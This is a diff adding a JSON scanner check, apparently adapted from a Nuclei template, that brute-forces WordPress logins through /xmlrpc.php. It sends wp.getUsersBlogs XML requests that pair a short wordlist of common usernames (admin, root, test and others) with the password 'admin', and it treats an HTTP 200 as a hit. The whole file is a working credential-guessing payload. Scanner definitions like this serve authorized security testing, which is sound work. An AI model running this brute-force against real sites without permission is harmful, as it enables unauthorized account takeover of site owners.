@@ -1,0 +1,30 @@
+{
+ "id": "nuc-wordpress-wp-xmlrpc-brute-force-2",
+ "engine": "wordpress",
+ "method": "POST",
+ "path": "/xmlrpc.php",
+ "payloads": [
+  "adm",
+  "admin",
+  "user",
+  "admin1",
+  "hostname",
+  "manager",
+  "qwerty",
+  "root",
+  "support",
+  "sysadmin",
+  "test",
+  "wordpress"
+ ],
+ "match": {
+  "type": "status_diff",
+  "value": 200
+ },
+ "score": 6,
+ "note": "nuclei: Wordpress XMLRPC.php username and password Bruteforcer",
+ "wordlist": true,
+ "where": "post-form",
+ "param": "username",
+ "body_tpl": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n <methodCall>\n   <methodName>wp.getUsersBlogs</methodName>\n   <params>\n     <param>\n       <value>{{p}}</value>\n     </param>\n       <param>\n     <value>admin</value>\n       </param>\n   </params>\n </methodCall>"
+}
